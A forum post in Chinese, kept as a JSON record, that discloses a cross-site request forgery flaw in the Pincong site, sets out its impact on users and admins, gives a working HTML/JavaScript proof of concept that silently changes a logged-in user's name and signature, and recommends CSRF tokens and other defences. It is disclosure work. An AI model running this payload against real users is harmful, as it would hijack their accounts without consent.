{"type":"article","id":10077,"title":"【安全漏洞】品葱存在安全漏洞","uid":14014,"topics":[199,6595],"contents":"<b>漏洞影响</b><br>\n<br>\n在<b>普通用户</b>已经登录品葱的情况下，如果<b>点击</b>了攻击者精心构造的链接，攻击者可以操纵帐号进行包括不限于<b>点赞、关注、更改隐私设置、更改个人profile</b>等操作<br>\n在<b>管理员</b>已经登录品葱的情况下，如果<b>点击</b>了攻击者精心构造的链接，攻击者除了可以操控普通帐号的功能外，还能进行<b>删除/创建用户，修改网站设置，添加网站统计代码</b><br>\n如果网站被添加统计代码攻击者就可以给所有用户执行任意JS代码，<b>搜集用户信息</b><br>\n<br>\n<b>漏洞POC</b><br>\n<br>\n将漏洞POC保存成HTML文件，在登录了品葱的浏览器中打开，即可发现品葱<b>账户名和签名被修改</b><br>\n<pre>&lt;!DOCTYPE&nbsp;html&gt;<br>\n&lt;html&nbsp;lang=\"en\"&gt;<br>\n&lt;head&gt;<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;meta&nbsp;charset=\"UTF-8\"&gt;<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;title&gt;POC&lt;/title&gt;<br>\n&lt;/head&gt;<br>\n&lt;body&gt;<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&gt;<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req&nbsp;=&nbsp;new&nbsp;XMLHttpRequest();<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;\"user_name=test123456&amp;sex=1&amp;signature=test123456&amp;default_timezone=&amp;_post_type=ajax\";&nbsp;<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req.open('post','https://pincong.rocks/account/ajax/profile_setting/',true);&nbsp;<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req.withCredentials&nbsp;=&nbsp;true;<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;req.send(data);<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/script&gt;<br>\n&lt;/body&gt;<br>\n&lt;/html&gt;<br>\n<br>\n</pre><br>\n<br>\n<br>\n<b>修复措施/防御建议</b><br>\n<br>\n站长可以通过增加<b>CSRF Token</b>来防范攻击，也可以通过检查<b>Referer头</b>进行简单防范<br>\n对于用户，应该在<b>浏览器隐身模式下使用品葱</b>以防范此类攻击<br>\n同时，由于品葱处在一个对抗性的网络环境中，建议在启用Cloudflare基础攻击防护的基础上在服务器上部署<b>文件防篡改防护</b>和<b>RASP防护</b>以防御变形payload攻击，同时在不储存用户的隐私的情况下保存系统日志定时审计<br>\n<br>\n<br>\n<b>最后</b><br>\n<br>\n希望我们能撑到每个人都能摘下面具的那一天","date":"2019-12-02","agreeCount":41,"discussionCount":0}